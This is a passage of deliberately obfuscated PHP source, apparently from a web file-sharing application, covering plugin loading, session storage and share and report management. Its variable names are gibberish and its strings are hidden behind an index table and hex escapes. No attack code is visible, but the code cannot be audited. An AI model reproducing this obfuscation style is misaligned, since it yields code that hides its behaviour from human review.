$“¸ÄÃ[1920]; if (!is_file($ı€¡±Ê)) { continue; } $Ù“¼ÙÊ› = Hook::apply($œÌœğ¡ô[$“¸ÄÃ[42]] . $“¸ÄÃ[1926]); if (is_array($Ù“¼ÙÊ›)) { $ÊµœŸıÛ[$´šä …¼] = array_merge($œÌœğ¡ô, $Ù“¼ÙÊ›); } } return $ÊµœŸıÛ; } private function loadPluginList() { $¦¡ı±òò =& $_SERVER[ë¦»ºéÌ]; $ë‰›œÂË = $this->loadList(); if (strtolower(MOD) == $¦¡ı±òò[1927]) { return $ë‰›œÂË; } $¿‘Îö±Å = Hook::trigger($¦¡ı±òò[1928], $ë‰›œÂË); if ($ë‰›œÂË && !$¿‘Îö±Å) { die; } return $¿‘Îö±Å ? $¿‘Îö±Å : $ë‰›œÂË; } private function pluginScan($¡‹é»ãÆ) { $Ğ½‡Ê™ =& $_SERVER[ë¦»ºéÌ]; recursion_dir(PLUGIN_DIR, $ú¤—‹¼ú, $ÊÃ´˜ˆ”, 0); foreach ($ú¤—‹¼ú as $èïªÓ¹Ğ) { $ÙÊßë¤¥ = get_path_this($èïªÓ¹Ğ); if (isset($¡‹é»ãÆ[$ÙÊßë¤¥]) || !file_exists($èïªÓ¹Ğ . $Ğ½‡Ê™[1929]) || !file_exists($èïªÓ¹Ğ . $Ğ½‡Ê™[1920])) { continue; } Hook::apply($ÙÊßë¤¥ . $Ğ½‡Ê™[1923]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\155\x5f\x73\x65\163\163\151\157\156"; public function get($–×ø¥ñş) { $´¸é†—ƒ =& $_SERVER[ë¦»ºéÌ]; $Ñ»½ù¢’ = $this->where(array($´¸é†—ƒ[1930] => $–×ø¥ñş))->find(); if (!is_array($Ñ»½ù¢’)) { return !1; } return $Ñ»½ù¢’[$´¸é†—ƒ[739]]; } public function set($Ìğ´§†ˆ, $¡¼è¨ÎŠ, $ÒŞ„©Şä = 3600) { $ŠŒß÷’ª =& $_SERVER[ë¦»ºéÌ]; $ã­©ô”ê = array($ŠŒß÷’ª[1930] => $Ìğ´§†ˆ, $ŠŒß÷’ª[1838] => $¡¼è¨ÎŠ, $ŠŒß÷’ª[1931] => $ÒŞ„©Şä + time()); if (Session::get($ŠŒß÷’ª[1932])) { $ã­©ô”ê[$ŠŒß÷’ª[1632]] = Session::get($ŠŒß÷’ª[1932]); } else { $ã­©ô”ê[$ŠŒß÷’ª[1632]] = 0; } if ($this->get($Ìğ´§†ˆ)) { return $this->where(array($ŠŒß÷’ª[1930] => $Ìğ´§†ˆ))->save($ã­©ô”ê); } else { return $this->add($ã­©ô”ê, array(), !0); } } public function remove($Š™˜Ÿ¦ç) { return $this->where(array($_SERVER[ë¦»ºéÌ][1930] => $Š™˜Ÿ¦ç))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ë¦»ºéÌ][1933] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\145"; protected $dataAuto = array(array("\x6d\157\144\x69\x66\171\x54\151\155\x65", "\x74\151\x6d\x65", "\151\x6e\163\x65\x72\164\x2c\x75\x70\144\x61\x74\x65", "\x66\x75\156\x63\164\151\157\156"), array("\143\x72\x65\x61\164\145\x54\151\x6d\x65", "\164\x69\155\145", "\x69\x6e\x73\x65\162\164", "\x66\x75\156\143\x74\151\157\156"), array("\x6f\x70\x74\151\157\x6e\x73", '', "\151\x6e\x73\x65\162\x74\x2c\165\160\144\x61\x74\145\x2c\163\145\154\x65\143\164", "\152\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($à€×ö•¶) { $¥¤ëÌÙÎ =& $_SERVER[ë¦»ºéÌ]; $´ä½¶·ë = isset($à€×ö•¶[0]) ? $à€×ö•¶[0] : !1; return array($¥¤ëÌÙÎ[1934] => array(USER_ID, $¥¤ëÌÙÎ[1935]), $¥¤ëÌÙÎ[1879] => array($´ä½¶·ë, $¥¤ëÌÙÎ[1936])); } protected function listSimple() { $Àï•ğïÍ = array($_SERVER[ë¦»ºéÌ][1632] => USER_ID); $Ÿîª•äú = $this->field($this->fieldList)->where($Àï•ğïÍ)->select(); return $Ÿîª•äú ? $Ÿîª•äú : array(); } protected function getInfo($¬Ù½®, $‹î³¤Ïø = false) { $É²Œø» =& $_SERVER[ë¦»ºéÌ]; if ($‹î³¤Ïø) { return $this->_getShareInfo(array($É²Œø»[490] => $¬Ù½®)); } $ûä²±ò˜ = $this->cacheFunctionGet($É²Œø»[1881], $¬Ù½®); return $ûä²±ò˜; } public function getInfoByHash($Í¥Áƒ œ) { return $this->_getShareInfo(array($_SERVER[ë¦»ºéÌ][492] => $Í¥Áƒ œ)); } public function getInfoByPath($…³º‰Ğ±) { $ú–¦ÒÌ =& $_SERVER[ë¦»ºéÌ]; $Ü€éµŠ‰ = array($ú–¦ÒÌ[1632] => USER_ID, $ú–¦ÒÌ[405] => $…³º‰Ğ±); return $this->_getShareInfo($Ü€éµŠ‰); } public function getInfoBySourcePath($£ï ”ß–) { $´²ïËÀ­ =& $_SERVER[ë¦»ºéÌ]; $å…“éË‘ = array($´²ïËÀ­[1632] => USER_ID, $´²ïËÀ­[1154] => $£ï ”ß–); return $this->_getShareInfo($å…“éË‘); } private function _getShareInfo($–ñ‡¢¨„) { $¾Ï±ÌÛ© =& $_SERVER[ë¦»ºéÌ]; $üàÀ¯·… = $this->where($–ñ‡¢¨„)->find(); if (!$üàÀ¯·…) { return !1; } $–ñ‡¢¨„ = array($¾Ï±ÌÛ©[490] => $üàÀ¯·…[$¾Ï±ÌÛ©[490]]); $ÆÇ¢•ß˜ = $¾Ï±ÌÛ©[1937]; $‡üËĞªË = Model($¾Ï±ÌÛ©[598])->order($¾Ï±ÌÛ©[403])->field($ÆÇ¢•ß˜)->where($–ñ‡¢¨„)->select(); if ($üàÀ¯·…[$¾Ï±ÌÛ©[405]] == $¾Ï±ÌÛ©[202]) { $üàÀ¯·…[$¾Ï±ÌÛ©[97]] = IO::info($üàÀ¯·…[$¾Ï±ÌÛ©[1154]]); } else { $üàÀ¯·…[$¾Ï±ÌÛ©[97]] = Model($¾Ï±ÌÛ©[1305])->pathInfo($üàÀ¯·…[$¾Ï±ÌÛ©[405]]); } $üàÀ¯·…[$¾Ï±ÌÛ©[1938]] = $‡üËĞªË; return $üàÀ¯·…; } protected function getInfoAuth($Óü€™) { $«Ó°ó”´ =& $_SERVER[ë¦»ºéÌ]; $§ÄÍˆˆ = $this->getInfo($Óü€™); if ($§ÄÍˆˆ[$«Ó°ó”´[1632]] == USER_ID) { $§ÄÍˆˆ[$«Ó°ó”´[416]] = $§ÄÍˆˆ[$«Ó°ó”´[97]][$«Ó°ó”´[416]]; } else { $§ÄÍˆˆ[$«Ó°ó”´[416]] = Model($«Ó°ó”´[504])->authMake($§ÄÍˆˆ[$«Ó°ó”´[1938]]); } return $§ÄÍˆˆ; } protected function listData($ëŠØèà× = null, $µÄ¥Åó = 300) { $·’ÖÓ¬ =& $_SERVER[ë¦»ºéÌ]; $©¥µßŒÜ = array(array($·’ÖÓ¬[495] => array($·’ÖÓ¬[992], 0), $·’ÖÓ¬[497] => array($·’ÖÓ¬[992], 0), $·’ÖÓ¬[1939] => $·’ÖÓ¬[1895])); if ($ëŠØèà× == $·’ÖÓ¬[1940]) { $©¥µßŒÜ = array($·’ÖÓ¬[495] => 1); } else { if ($ëŠØèà× == $·’ÖÓ¬[1139]) { $©¥µßŒÜ = array($·’ÖÓ¬[497] => 1); } } $©¥µßŒÜ[$·’ÖÓ¬[1632]] = USER_ID; $–«Ãûò­ = $this->where($©¥µßŒÜ)->selectPage($µÄ¥Åó); return $–«Ãûò­; } protected function listToMe($ÉÛãáÖû = 300) { $—ü£ø¸ =& $_SERVER[ë¦»ºéÌ]; $¦õÑŠ›® = Model($—ü£ø¸[1941])->userGroupParents(USER_ID); $ßĞªı‘› = array($—ü£ø¸[582] => SourceModel::TYPE_USER, $—ü£ø¸[506] => USER_ID); if ($¦õÑŠ›®) { $ßĞªı‘› = array(array($—ü£ø¸[582] => SourceModel::TYPE_USER, $—ü£ø¸[506] => USER_ID), array($—ü£ø¸[582] => SourceModel::TYPE_GROUP, $—ü£ø¸[506] => array($—ü£ø¸[7], $¦õÑŠ›®)), $—ü£ø¸[1939] => $—ü£ø¸[1895]); } $–øÎÚÙš = Model($—ü£ø¸[598])->where($ßĞªı‘›)->selectPage($ÉÛãáÖû); $£‘—ÙÑ€ = array_to_keyvalue_group($–øÎÚÙš[$—ü£ø¸[375]], $—ü£ø¸[490]); if (!$£‘—ÙÑ€) { return $–øÎÚÙš; } $ªÀ¾ŠÂ = $—ü£ø¸[1942]; $ßĞªı‘› = array($—ü£ø¸[490] => array($—ü£ø¸[421], array_keys($£‘—ÙÑ€)), $—ü£ø¸[1632] => array($—ü£ø¸[994], $—ü£ø¸[202])); $Ø×Šêë = $this->field($ªÀ¾ŠÂ)->where($ßĞªı‘›)->select(); foreach ($Ø×Šêë as $ à¾ã„ => &$‰’Û‰×Š) { $‰’Û‰×Š[$—ü£ø¸[1938]] = $£‘—ÙÑ€[$‰’Û‰×Š[$—ü£ø¸[490]]]; } unset($‰’Û‰×Š); $–š³¤‰‘ = array($—ü£ø¸[1943] => $Ø×Šêë, $—ü£ø¸[1944] => $–øÎÚÙš[$—ü£ø¸[372]]); return $–š³¤‰‘; } protected function shareAdd($‰“ŠÄ»Â, $”“ û ‹) { $‹Ì³´âæ =& $_SERVER[ë¦»ºéÌ]; $‚úö»Ö¾ = $this->_addShareData($‰“ŠÄ»Â, $”“ û ‹); if (!empty($”“ û ‹[$‹Ì³´âæ[1945]])) { $this->_shareAuthSet($‚úö»Ö¾, $”“ û ‹[$‹Ì³´âæ[1945]]); } $this->shareEventAdd($‰“ŠÄ»Â, $”“ û ‹, $‹Ì³´âæ[1142]); return $‚úö»Ö¾; } protected function shareAddSystem($…ä†¡…€, $ÑÛ“¼ù‘) { $¼¢Ä™‚ã =& $_SERVER[ë¦»ºéÌ]; $¨’®İæÂ = $this->_addShareData($…ä†¡…€, $ÑÛ“¼ù‘, $¼¢Ä™‚ã[1254]); $this->_shareAuthSet($¨’®İæÂ, $ÑÛ“¼ù‘[$¼¢Ä™‚ã[1945]]); return $¨’®İæÂ; } private function shareEventAdd($¦î½©Ş…, $æ÷øƒ­ù, $ôì½÷ÀĞ = "\x61\144\x64") { $Ù÷­³àÊ =& $_SERVER[ë¦»ºéÌ]; if (!$¦î½©Ş… || $¦î½©Ş… == $Ù÷­³àÊ[202]) { return; } if ($ôì½÷ÀĞ == $Ù÷­³àÊ[1142]) { if ($æ÷øƒ­ù[$Ù÷­³àÊ[495]] == $Ù÷­³àÊ[99]) { Model($Ù÷­³àÊ[566])->eventShare($¦î½©Ş…, $Ù÷­³àÊ[1946]); } if ($æ÷øƒ­ù[$Ù÷­³àÊ[497]] == $Ù÷­³àÊ[99]) { Model($Ù÷­³àÊ[566])->eventShare($¦î½©Ş…, $Ù÷­³àÊ[1947]); } return; } $ÂšÏ–½Ï = $this->getInfoByPath($¦î½©Ş…); $á§‹ı = $Ù÷­³àÊ[1948]; if ($ÂšÏ–½Ï[$Ù÷­³àÊ[495]] == $Ù÷­³àÊ[202] && $æ÷øƒ­ù[$Ù÷­³àÊ[495]] == $Ù÷­³àÊ[99]) { $á§‹ı = $Ù÷­³àÊ[1946]; } if ($ÂšÏ–½Ï[$Ù÷­³àÊ[495]] == $Ù÷­³àÊ[99] && $æ÷øƒ­ù[$Ù÷­³àÊ[495]] == $Ù÷­³àÊ[202]) { $á§‹ı = $Ù÷­³àÊ[1949]; } if ($ÂšÏ–½Ï[$Ù÷­³àÊ[497]] == $Ù÷­³àÊ[202] && $æ÷øƒ­ù[$Ù÷­³àÊ[497]] == $Ù÷­³àÊ[99]) { $á§‹ı = $Ù÷­³àÊ[1947]; } if ($ÂšÏ–½Ï[$Ù÷­³àÊ[497]] == $Ù÷­³àÊ[99] && $æ÷øƒ­ù[$Ù÷­³àÊ[497]] == $Ù÷­³àÊ[202]) { $á§‹ı = $Ù÷­³àÊ[1950]; } Model($Ù÷­³àÊ[566])->eventShare($¦î½©Ş…, $á§‹ı); return; } private function _addShareData($á•Æ…´‚, $ü„¼Ü†« = array(), $–€ó Æ = false) { $¼Ö¼àˆ =& $_SERVER[ë¦»ºéÌ]; $€Ìâ—Ï = $–€ó Æ == $¼Ö¼àˆ[1254] ? 0 : USER_ID; $§šºøè© = array($¼Ö¼àˆ[420] => $á•Æ…´‚, $¼Ö¼àˆ[1623] => $€Ìâ—Ï); if ($á•Æ…´‚ == 0) { $§šºøè© = array($¼Ö¼àˆ[1951] => $ü„¼Ü†«[$¼Ö¼àˆ[1154]], $¼Ö¼àˆ[1623] => $€Ìâ—Ï); } if ($ô›ùÑøí = $this->where($§šºøè©)->find()) { return $ô›ùÑøí[$¼Ö¼àˆ[490]]; } if ($á•Æ…´‚ == 0) { $¥ÚÒ€˜Ê = array($¼Ö¼àˆ[42] => get_path_this($ü„¼Ü†«[$¼Ö¼àˆ[88]])); } else { $¥ÚÒ€˜Ê = Model($¼Ö¼àˆ[809])->sourceInfo($á•Æ…´‚); if (!$¥ÚÒ€˜Ê) { return !1; } } if (!$ü„¼Ü†«[$¼Ö¼àˆ[1532]]) { $ü„¼Ü†«[$¼Ö¼àˆ[1532]] = $¥ÚÒ€˜Ê[$¼Ö¼àˆ[42]]; } $úÒú§õä = array($¼Ö¼àˆ[1623] => $€Ìâ—Ï, $¼Ö¼àˆ[420] => $á•Æ…´‚, $¼Ö¼àˆ[1532] => $¼Ö¼àˆ[12], $¼Ö¼àˆ[495] => 0, $¼Ö¼àˆ[497] => 0, $¼Ö¼àˆ[1154] => $¼Ö¼àˆ[12], $¼Ö¼àˆ[313] => $¼Ö¼àˆ[12], $¼Ö¼àˆ[869] => $¼Ö¼àˆ[12], $¼Ö¼àˆ[1952] => 0, $¼Ö¼àˆ[1953] => 0, $¼Ö¼àˆ[498] => 0, $¼Ö¼àˆ[499] => $¼Ö¼àˆ[12], $¼Ö¼àˆ[492] => $¼Ö¼àˆ[12]); $íÇã¯è• = explode($¼Ö¼àˆ[60], $¼Ö¼àˆ[1954]); foreach ($íÇã¯è• as $—æÒşÆ) { if (!isset($ü„¼Ü†«[$—æÒşÆ])) { continue; } $úÒú§õä[$—æÒşÆ] = $ü„¼Ü†«[$—æÒşÆ]; } $×ÚÍ‰£ = $this->add($úÒú§õä); $ö›ƒ¹Á… = array($¼Ö¼àˆ[492] => short_id($×ÚÍ‰£)); $this->where(array($¼Ö¼àˆ[489] => $×ÚÍ‰£))->save($ö›ƒ¹Á…); return $×ÚÍ‰£; } private function _shareAuthSet($àËŞ£‡, $ÕÓ”ÚÔÔ) { $·ó¤˜› =& $_SERVER[ë¦»ºéÌ]; if (!is_array($ÕÓ”ÚÔÔ)) { return !1; } $âŠÜŒ³ú = Model($·ó¤˜›[1905]); $âŠÜŒ³ú->where(array($·ó¤˜›[490] => $àËŞ£‡))->delete(); $Ãß£ÅäĞ = array(); foreach ($ÕÓ”ÚÔÔ as $Å³Õ¦®×) { $Ì¿º˜èğ = SourceModel::TYPE_USER; if ($Å³Õ¦®×[$·ó¤˜›[414]] == SourceModel::TYPE_GROUP) { $Ì¿º˜èğ = SourceModel::TYPE_GROUP; } $Å¥–à… = array($·ó¤˜›[490] => $àËŞ£‡, $·ó¤˜›[414] => $Ì¿º˜èğ, $·ó¤˜›[506] => intval($Å³Õ¦®×[$·ó¤˜›[506]]), $·ó¤˜›[1901] => 0, $·ó¤˜›[1955] => -1); if ($Å³Õ¦®×[$·ó¤˜›[1901]]) { $Å¥–à…[$·ó¤˜›[1901]] = $Å³Õ¦®×[$·ó¤˜›[1901]]; } else { if ($Å³Õ¦®×[$·ó¤˜›[1955]]) { $Å¥–à…[$·ó¤˜›[1955]] = $Å³Õ¦®×[$·ó¤˜›[1955]]; } } $Ãß£ÅäĞ[] = $Å¥–à…; } return $âŠÜŒ³ú->addAll($Ãß£ÅäĞ, array(), !0); } public function numViewAdd($ã°’™­ƒ) { $ßˆô“Èë =& $_SERVER[ë¦»ºéÌ]; $÷”§Ş± = array($ßˆô“Èë[489] => $ã°’™­ƒ); $this->where($÷”§Ş±)->setAdd($ßˆô“Èë[1952]); } public function numDownloadAdd($“Çˆ×Ó) { $ùù†ìºù =& $_SERVER[ë¦»ºéÌ]; $ëÏ‰¥Í = array($ùù†ìºù[489] => $“Çˆ×Ó); $this->where($ëÏ‰¥Í)->setAdd($ùù†ìºù[1953]); } protected function shareEdit($¢èıÎÊº, $¾Á¤ˆ…) { $‚¸×ñä =& $_SERVER[ë¦»ºéÌ]; $ß‘ìó©‹ = $this->getInfo($¢èıÎÊº); if (!$ß‘ìó©‹) { return !1; } $this->_checkLinkShare($¾Á¤ˆ…, $ß‘ìó©‹); $ê¿û„äµ = array(); $¨ûñâ˜ı = explode($‚¸×ñä[60], $‚¸×ñä[1956]); foreach ($¨ûñâ˜ı as $Óäï¥ù») { if (!array_key_exists($Óäï¥ù», $¾Á¤ˆ…)) { continue; } $ê¿û„äµ[$Óäï¥ù»] = $¾Á¤ˆ…[$Óäï¥ù»]; } $this->shareEventAdd($ß‘ìó©‹[$‚¸×ñä[405]], $¾Á¤ˆ…, $‚¸×ñä[1770]); $this->where(array($‚¸×ñä[489] => $¢èıÎÊº))->save($ê¿û„äµ); if (isset($¾Á¤ˆ…[$‚¸×ñä[1945]])) { $this->_shareAuthSet($¢èıÎÊº, $¾Á¤ˆ…[$‚¸×ñä[1945]]); } return !0; } private function _checkLinkShare($½Êİ“ôÏ, $ÄÇõµù’) { $®èìû¢² =& $_SERVER[ë¦»ºéÌ]; if ($½Êİ“ôÏ[$®èìû¢²[495]] != $®èìû¢²[99]) { return; } $³åÃ°š³ = $ÄÇõµù’[$®èìû¢²[97]][$®èìû¢²[405]]; if ($ÄÇõµù’[$®èìû¢²[97]][$®èìû¢²[43]] != $®èìû¢²[204]) { $ãŸÇÍø¡ = $this->_folderReport($³åÃ°š³); if (!$ãŸÇÍø¡) { return; } show_json(LNG($®èìû¢²[1957]) . $®èìû¢²[1958] . $ãŸÇÍø¡, !1); } $…û¥®Ğ = Model($®èìû¢²[809])->fileInfoGet($ÄÇõµù’[$®èìû¢²[97]][$®èìû¢²[405]]); if (!$…û¥®Ğ) { return; } $ëõ‰ºß = $this->shareFileMeta($…û¥®Ğ[$®èìû¢²[469]]); if (isset($ëõ‰ºß[$®èìû¢²[380]]) && $ëõ‰ºß[$®èìû¢²[380]] == $®èìû¢²[99]) { show_json(LNG($®èìû¢²[1959]), !1); } } private function _folderReport($šÈ»Æ±‰) { $Š¸İÏİ½ =& $_SERVER[ë¦»ºéÌ]; $¾º †Óæ = array($Š¸İÏİ½[469] => array($Š¸İÏİ½[992], 0), $Š¸İÏİ½[734] => 3); $¸÷²š¦ë = Model($Š¸İÏİ½[1960])->where($¾º †Óæ)->field($Š¸İÏİ½[469])->select(); if (!$¸÷²š¦ë) { return !1; } $¸÷²š¦ë = array_to_keyvalue($¸÷²š¦ë, $Š¸İÏİ½[12], $Š¸İÏİ½[469]); $ÓİÆ×Ú = $Š¸İÏİ½[60] . $šÈ»Æ±‰ . $Š¸İÏİ½[60]; $¾º †Óæ = array($Š¸İÏİ½[469] => array($Š¸İÏİ½[7], $¸÷²š¦ë), $Š¸İÏİ½[523] => array($Š¸İÏİ½[389], "\45{$ÓİÆ×Ú}\x25"), $Š¸İÏİ½[433] => 0); $°¦î·Ä = Model($Š¸İÏİ½[809])->where($¾º †Óæ)->field($Š¸İÏİ½[1961])->find(); if (!$°¦î·Ä) { return !1; } $©î–ïï§ = substr($°¦î·Ä[$Š¸İÏİ½[523]], strpos($°¦î·Ä[$Š¸İÏİ½[523]], $ÓİÆ×Ú)); $¾º †Óæ = array($Š¸İÏİ½[405] => array($Š¸İÏİ½[7], trim($©î–ïï§, $Š¸İÏİ½[60]))); $ÏÚ «©Õ = Model($Š¸İÏİ½[809])->where($¾º †Óæ)->field($Š¸İÏİ½[42])->select(); $¼¤á—Å¸ = array_to_keyvalue($ÏÚ «©Õ, $Š¸İÏİ½[12], $Š¸İÏİ½[42]); $¼¤á—Å¸[] = $°¦î·Ä[$Š¸İÏİ½[42]]; return implode($Š¸İÏİ½[8], $¼¤á—Å¸); } protected function remove($¸Ü‹ş½ı) { $­ÏÁıù =& $_SERVER[ë¦»ºéÌ]; if (is_array($¸Ü‹ş½ı)) { $¸Ü‹ş½ı = array($­ÏÁıù[7], $¸Ü‹ş½ı); } $¹‰«³×× = array($­ÏÁıù[490] => $¸Ü‹ş½ı); $™ÁßğÄ = $this->where($¹‰«³××)->delete(); if ($™ÁßğÄ) { Model($­ÏÁıù[598])->where(array($­ÏÁıù[490] => $¸Ü‹ş½ı))->delete(); } $ÜÍ”œº = is_array($¸Ü‹ş½ı) ? $¸Ü‹ş½ı[1] : array($¸Ü‹ş½ı); for ($×¶±‚å = 0; $×¶±‚å < count($ÜÍ”œº); $×¶±‚å++) { $íüì§« = $this->getInfo($ÜÍ”œº[$×¶±‚å]); if ($íüì§«[$­ÏÁıù[497]] == $­ÏÁıù[99]) { Model($­ÏÁıù[566])->eventShare($íüì§«[$­ÏÁıù[405]], $­ÏÁıù[1950]); } if ($íüì§«[$­ÏÁıù[495]] == $­ÏÁıù[99]) { Model($­ÏÁıù[566])->eventShare($íüì§«[$­ÏÁıù[405]], $­ÏÁıù[1949]); } } return $™ÁßğÄ; } protected function removeBySource($´¡·°’) { $šÌ¸øÍè =& $_SERVER[ë¦»ºéÌ]; $‰òÅÆâè = array($šÌ¸øÍè[420] => array($šÌ¸øÍè[421], $´¡·°’)); $­íşõƒ = $this->field($šÌ¸øÍè[490])->where($‰òÅÆâè)->select(); $­íşõƒ = array_to_keyvalue($­íşõƒ, $šÌ¸øÍè[12], $šÌ¸øÍè[490]); if (!$­íşõƒ) { return; } $‰òÅÆâè = array($šÌ¸øÍè[489] => array($šÌ¸øÍè[421], $­íşõƒ)); $this->where($‰òÅÆâè)->delete(); Model($šÌ¸øÍè[598])->where($‰òÅÆâè)->delete(); } public function listAll($€°©‡¡) { $íì¸åğÊ =& $_SERVER[ë¦»ºéÌ]; $›ıåÛ¬ê = array(); if ($€°©‡¡[$íì¸åğÊ[1632]]) { $›ıåÛ¬ê[$íì¸åğÊ[1632]] = $€°©‡¡[$íì¸åğÊ[1632]]; } if ($€°©‡¡[$íì¸åğÊ[745]]) { $ÉËÔ¹ò = $€°©‡¡[$íì¸åğÊ[498]] ? $€°©‡¡[$íì¸åğÊ[498]] : strtotime(date($íì¸åğÊ[1962])); $›ıåÛ¬ê[$íì¸åğÊ[205]] = array($íì¸åğÊ[339], array($€°©‡¡[$íì¸åğÊ[745]], $ÉËÔ¹ò)); } if ($€°©‡¡[$íì¸åğÊ[43]]) { $›ıåÛ¬ê[$€°©‡¡[$íì¸åğÊ[43]]] = 1; } else { $›ıåÛ¬ê[] = array($íì¸åğÊ[495] => array($íì¸åğÊ[992], 0), $íì¸åğÊ[497] => array($íì¸åğÊ[992], 0), $íì¸åğÊ[1939] => $íì¸åğÊ[1895]); } if ($€°©‡¡[$íì¸åğÊ[1891]]) { $›ıåÛ¬ê[] = array($íì¸åğÊ[492] => $€°©‡¡[$íì¸åğÊ[1891]], $íì¸åğÊ[1532] => array($íì¸åğÊ[389], "\45{$€°©‡¡[$íì¸åğÊ[1891]]}\45"), $íì¸åğÊ[1939] => $íì¸åğÊ[1895]); } $§ıØšÁ¤ = $this->_makeOrder()->where($›ıåÛ¬ê)->selectPage(20); if (empty($§ıØšÁ¤[$íì¸åğÊ[375]])) { return array(); } $this->_listDataApply($§ıØšÁ¤[$íì¸åğÊ[375]]); return $§ıØšÁ¤; } public function listDataApply($Ç¯¥µ‹) { $this->_listDataApply($Ç¯¥µ‹); return $Ç¯¥µ‹; } private function _listDataApply(&$˜ƒô·ò) { $§‚ûôÉ¥ =& $_SERVER[ë¦»ºéÌ]; $«æÈğ•´ = array_to_keyvalue($˜ƒô·ò, $§‚ûôÉ¥[12], $§‚ûôÉ¥[1632]); $Èˆ¢è³ê = Model($§‚ûôÉ¥[540])->userListInfo(array_unique($«æÈğ•´)); $Õ˜Û©üˆ = array_to_keyvalue($˜ƒô·ò, $§‚ûôÉ¥[12], $§‚ûôÉ¥[405]); $ñÚ·¶Ğ” = Model($§‚ûôÉ¥[809])->sourceListInfo($Õ˜Û©üˆ, !0); foreach ($˜ƒô·ò as $ŸåƒØÆÑ => &$…÷‡€®²) { $‹¾š®ŞÈ = $…÷‡€®²[$§‚ûôÉ¥[1632]]; $…÷‡€®²[$§‚ûôÉ¥[1963]] = $Èˆ¢è³ê[$‹¾š®ŞÈ] ? $Èˆ¢è³ê[$‹¾š®ŞÈ] : !1; $âÜÎè = $…÷‡€®²[$§‚ûôÉ¥[405]]; $…÷‡€®²[$§‚ûôÉ¥[97]] = $ñÚ·¶Ğ”[$âÜÎè] ? $ñÚ·¶Ğ”[$âÜÎè] : !1; if ($…÷‡€®²[$§‚ûôÉ¥[97]][$§‚ûôÉ¥[433]] == $§‚ûôÉ¥[99]) { unset($˜ƒô·ò[$ŸåƒØÆÑ]); } if ($…÷‡€®²[$§‚ûôÉ¥[97]] != $§‚ûôÉ¥[202] && !$…÷‡€®²[$§‚ûôÉ¥[97]]) { unset($˜ƒô·ò[$ŸåƒØÆÑ]); } } unset($…÷‡€®²); $˜ƒô·ò = array_values($˜ƒô·ò); } private function _makeOrder($Ñ›£œ€­ = '') { $üñ§¬ú³ =& $_SERVER[ë¦»ºéÌ]; $õÏàäº = array($üñ§¬ú³[205], $üñ§¬ú³[498], $üñ§¬ú³[1952], $üñ§¬ú³[1953]); $æªøà˜Œ = array($üñ§¬ú³[450] => $üñ§¬ú³[451], $üñ§¬ú³[452] => $üñ§¬ú³[453]); $ñÒ®¬¤ = Input::get($üñ§¬ú³[457], $üñ§¬ú³[7], $üñ§¬ú³[426], $õÏàäº); $¤ú¼Êö = Input::get($üñ§¬ú³[458], $üñ§¬ú³[7], $üñ§¬ú³[1964], array($üñ§¬ú³[1890], $üñ§¬ú³[452])); $¤ú¼Êö = $æªøà˜Œ[$¤ú¼Êö]; $Ñ›£œ€­ = $Ñ›£œ€­ . "{$ñÒ®¬¤}\x20{$¤ú¼Êö}"; return $this->order($Ñ›£œ€­); } public function reportAdd($÷Ìâ±¶”) { $×‘Üï’§ =& $_SERVER[ë¦»ºéÌ]; $‘Ş¤œÚ† = array($×‘Üï’§[490] => $÷Ìâ±¶”[$×‘Üï’§[490]], $×‘Üï’§[1632] => USER_ID); if (Model($×‘Üï’§[1960])->where($‘Ş¤œÚ†)->find()) { return !1; } $¸åÛµéÏ = array($×‘Üï’§[490] => $÷Ìâ±¶”[$×‘Üï’§[490]], $×‘Üï’§[1532] => $÷Ìâ±¶”[$×‘Üï’§[1532]], $×‘Üï’§[405] => $÷Ìâ±¶”[$×‘Üï’§[405]], $×‘Üï’§[469] => $÷Ìâ±¶”[$×‘Üï’§[469]], $×‘Üï’§[1632] => USER_ID, $×‘Üï’§[43] => $÷Ìâ±¶”[$×‘Üï’§[43]], $×‘Üï’§[453] => $÷Ìâ±¶”[$×‘Üï’§[453]]); return Model($×‘Üï’§[1960])->add($¸åÛµéÏ); } public function reportList($æº§Æ‘Ã) { $ şƒÆ¤Ç =& $_SERVER[ë¦»ºéÌ]; $êŞ”’â€ = array(); if ($æº§Æ‘Ã[$ şƒÆ¤Ç[745]]) { $Õ¬ûÆïõ = $æº§Æ‘Ã[$ şƒÆ¤Ç[498]] ? $æº§Æ‘Ã[$ şƒÆ¤Ç[498]] : strtotime(date($ şƒÆ¤Ç[1962])); $êŞ”’â€[$ şƒÆ¤Ç[205]] = array($ şƒÆ¤Ç[339], array($æº§Æ‘Ã[$ şƒÆ¤Ç[745]], $Õ¬ûÆïõ)); } if (isset($æº§Æ‘Ã[$ şƒÆ¤Ç[43]]) && in_array($æº§Æ‘Ã[$ şƒÆ¤Ç[43]], array($ şƒÆ¤Ç[99], $ şƒÆ¤Ç[437], $ şƒÆ¤Ç[1965], $ şƒÆ¤Ç[1966], $ şƒÆ¤Ç[1967]))) { $êŞ”’â€[$ şƒÆ¤Ç[43]] = $æº§Æ‘Ã[$ şƒÆ¤Ç[43]]; } if (isset($æº§Æ‘Ã[$ şƒÆ¤Ç[734]]) && in_array($æº§Æ‘Ã[$ şƒÆ¤Ç[734]], array($ şƒÆ¤Ç[202], $ şƒÆ¤Ç[99], $ şƒÆ¤Ç[437], $ şƒÆ¤Ç[1965]))) { $êŞ”’â€[$ şƒÆ¤Ç[734]] = $æº§Æ‘Ã[$ şƒÆ¤Ç[734]]; } $òÚœà‘† = Input::get($ şƒÆ¤Ç[458], $ şƒÆ¤Ç[7], $ şƒÆ¤Ç[1964], array($ şƒÆ¤Ç[1890], $ şƒÆ¤Ç[452])); $Û„›¼› = array($ şƒÆ¤Ç[450] => $ şƒÆ¤Ç[451], $ şƒÆ¤Ç[452] => $ şƒÆ¤Ç[453]); $”ŸçÚ“Î = $ şƒÆ¤Ç[1968] . $Û„›¼›[$òÚœà‘†]; $­ÅÊñ  = Model($ şƒÆ¤Ç[1960])->where($êŞ”’â€)->order($”ŸçÚ“Î)->selectPage(20); if (empty($­ÅÊñ [$ şƒÆ¤Ç[375]])) { return array(); } $“îšºåÁ = array_to_keyvalue_group($­ÅÊñ [$ şƒÆ¤Ç[375]], $ şƒÆ¤Ç[734], $ şƒÆ¤Ç[490]); if (!empty($“îšºåÁ[0])) { $æº§Æ‘Ã = $“îšºåÁ[0]; $êŞ”’â€ = array($ şƒÆ¤Ç[490] => array($ şƒÆ¤Ç[7], 